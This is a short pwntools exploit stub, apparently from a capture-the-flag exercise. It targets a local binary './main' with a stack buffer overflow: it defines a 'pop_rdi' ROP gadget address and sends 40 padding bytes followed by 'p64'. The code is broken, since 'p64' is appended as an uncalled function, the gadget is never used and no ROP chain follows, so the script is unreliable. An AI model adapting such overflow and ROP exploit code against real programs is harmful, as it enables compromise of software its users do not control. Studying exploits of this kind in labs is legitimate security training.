from pwn import *

pop_rdi = 0x000000000000115d

p = process('./main')
p.sendline(b'A'*40+p64)

